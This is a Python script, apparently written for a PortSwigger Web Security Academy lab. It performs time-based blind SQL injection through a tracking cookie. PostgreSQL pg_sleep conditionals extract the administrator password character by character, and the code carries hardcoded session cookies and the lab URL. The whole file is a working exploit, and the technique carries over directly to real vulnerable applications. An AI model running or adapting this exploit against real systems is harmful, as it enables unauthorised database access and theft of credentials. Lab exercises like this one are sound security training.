#!/usr/bin/env python3


import requests
from time import time
import urllib.parse
from string import ascii_lowercase, digits

"""
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(0)+ELSE+pg_sleep(10)+END--
Cookie: TrackingId=1H0mqQasF2if0yX1; session=RjVw5aZdHmXF6xfpksZR0jz5z2RwNYoY
#payload = f"{trackingid}';SELECT CASE WHEN (SUBSTRING(password,{position},1)='{characters}') THEN pg_sleep(15) ELSE pg_sleep(0) END FROM users LIMIT 1--"

"""
trackingid = '1H0mqQasF2if0yX1'

url = 'https://0aa4006c044d901780e66c0d006e00c1.web-security-academy.net/'


# !/usr/bin/env python3


def main(sessionId, chars):
    # Send the payload
    password = ''
    position = 1

    try:
        while True:
            for characters in chars:
                payload = f"""{trackingid}';SELECT CASE WHEN (SUBSTRING(password,{position},1)='{characters}') THEN pg_sleep(15) ELSE pg_sleep(0) END FROM USERS WHERE username='administrator' LIMIT 1--"""
                finalPayload = urllib.parse.quote(payload)

                cookie = {
                    'session': sessionId,
                    'TrackingId': finalPayload
                }

                startTime = time()
                requests.get(url, cookies=cookie)
                endTime = time()

                timeDifference = endTime - startTime

                if timeDifference >= 15:
                    position += 1
                    password += characters
                    print(f'[+] Found password characters: {password}', end='\r')
                    break
                    # print(f'[+] The request time difference is: {timeDifference:.2f}s')

            if len(password) >= 20:
                print(f'\n[+] Found password: {password}')
                exit()

    except KeyboardInterrupt:
        print('\n[*] Bye!')


if __name__ == '__main__':
    chars = ascii_lowercase + digits
    sessionId = 'RjVw5aZdHmXF6xfpksZR0jz5z2RwNYoY'

    main(sessionId, chars)